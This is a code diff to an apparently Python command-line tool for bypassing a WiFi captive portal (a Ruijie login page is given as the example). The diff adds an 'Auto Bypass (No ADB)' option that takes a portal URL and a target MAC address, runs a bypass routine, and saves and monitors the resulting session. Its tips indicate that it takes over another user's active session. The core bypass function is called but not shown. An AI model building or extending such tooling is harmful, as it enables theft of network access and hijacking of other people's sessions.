@@ -277,7 +277,7 @@ def print_menu(expiry):
     print(f"  {YELLOW}[2] MAC Scan{RESET}")
     print(f"  {GREEN}[3] Active Check{RESET}")
     print(f"  {YELLOW}[4] Select Target{RESET}")
-    print(f"  {YELLOW}[5] AES Encrypt Tool{RESET}")
+    print(f"  {CYAN}[5] Auto Bypass  (No ADB){RESET}")
     print(f"  {YELLOW}[6] Encode Session URL{RESET}")
     print(f"  {GREEN}[7] Auto Bypass{RESET}")
     print(f"  {RED}[0] Exit{RESET}")
@@ -735,14 +735,72 @@ def option_select_target(expiry):
         print(f"{RED}[-] Invalid input.{RESET}")
         time.sleep(1)
 
-# ==================== OPTION 5: AES TOOL ====================
-def option_aes_encrypt(expiry):
+# ==================== OPTION 5: AUTO BYPASS (NO ADB) ====================
+def option_no_adb_bypass(expiry):
+    global SELECTED_MAC, PORTAL_URL
     print_header(expiry)
-    while True:
-        text = input(f"\n{YELLOW}Enter text to encrypt (or 'exit'): {RESET}").strip()
-        if text == 'exit':
-            break
-        print(f"{GREEN}[+] Encrypted: {CYAN}{aes_encrypt(text)}{RESET}")
+    print(f"\n{CYAN}[*] Auto Bypass (No ADB) — Option 5{RESET}")
+    print(_sep())
+
+    # ── Portal URL ───────────────────────────────────────────────────
+    if PORTAL_URL:
+        short = PORTAL_URL[:60] + "..." if len(PORTAL_URL) > 63 else PORTAL_URL
+        print(f"\n{DG}[*] Cached Portal URL : {CYAN}{short}{RESET}")
+        change = input(f"{YELLOW}[?] Use cached URL? (Y/n) : {RESET}").strip().lower()
+        if change == 'n':
+            PORTAL_URL = ""
+    if not PORTAL_URL:
+        print(f"\n{YELLOW}[?] Enter Portal URL (WiFi captive portal link){RESET}")
+        print(f"{DW}    e.g: http://portal-as.ruijienetworks.com/auth/wifidogAuth/login?...{RESET}")
+        url_in = input(f"\n  {CYAN}Portal URL : {RESET}").strip()
+        if not url_in:
+            print(f"{RED}[-] Portal URL is required.{RESET}")
+            input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
+            return
+        PORTAL_URL = url_in
+
+    # ── MAC Address ──────────────────────────────────────────────────
+    if SELECTED_MAC:
+        print(f"\n{DG}[*] Cached MAC : {CYAN}{SELECTED_MAC}{RESET}")
+        change_mac = input(f"{YELLOW}[?] Use cached MAC? (Y/n) : {RESET}").strip().lower()
+        if change_mac == 'n':
+            SELECTED_MAC = ""
+    if not SELECTED_MAC:
+        print(f"\n{YELLOW}[?] Enter target MAC address{RESET}")
+        print(f"{DW}    e.g: aa:bb:cc:dd:ee:ff{RESET}")
+        mac_in = input(f"\n  {CYAN}MAC Address : {RESET}").strip().lower()
+        if not mac_in:
+            print(f"{RED}[-] MAC address is required.{RESET}")
+            input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
+            return
+        SELECTED_MAC = mac_in
+
+    # ── Run Bypass ───────────────────────────────────────────────────
+    print()
+    print(f"{YELLOW}[*] MAC    : {WHITE}{SELECTED_MAC}{RESET}")
+    portal_short = PORTAL_URL[:60] + "..." if len(PORTAL_URL) > 63 else PORTAL_URL
+    print(f"{YELLOW}[*] Portal : {WHITE}{portal_short}{RESET}")
+    print()
+    print(f"{CYAN}[*] Bypassing... (no ADB required){RESET}")
+    print(_sep())
+
+    ok, sid = run_bypass_for_mac(PORTAL_URL, SELECTED_MAC, cached_sid=None, verbose=True)
+
+    print(_sep())
+
+    if ok:
+        _show_bypass_success(SELECTED_MAC, sid)
+        save_session()
+        monitor_connection(PORTAL_URL, SELECTED_MAC, sid)
+    else:
+        print(f"\n{RED}╔══════════════════════════════════╗{RESET}")
+        print(f"{RED}║   BYPASS FAILED — All rounds ✗   ║{RESET}")
+        print(f"{RED}╚══════════════════════════════════╝{RESET}")
+        print(f"{YELLOW}[!] Tips:{RESET}")
+        print(f"{DG}  • Check Portal URL is correct{RESET}")
+        print(f"{DG}  • Confirm MAC belongs to an active session{RESET}")
+        print(f"{DG}  • Ensure Ruijie API server is reachable{RESET}")
+        input(f"\n{YELLOW}[!] Press Enter...{RESET}")
 
 # ==================== OPTION 6: ENCODE URL ====================
 def option_encode_session(expiry):
@@ -1074,7 +1132,7 @@ def main():
         elif ch == "2": option_mac_scan(expiry)
         elif ch == "3": option_active_check(expiry)
         elif ch == "4": option_select_target(expiry)
-        elif ch == "5": option_aes_encrypt(expiry)
+        elif ch == "5": option_no_adb_bypass(expiry)
         elif ch == "6": option_encode_session(expiry)
         elif ch == "7": option_auto_bypass(expiry)
         else:
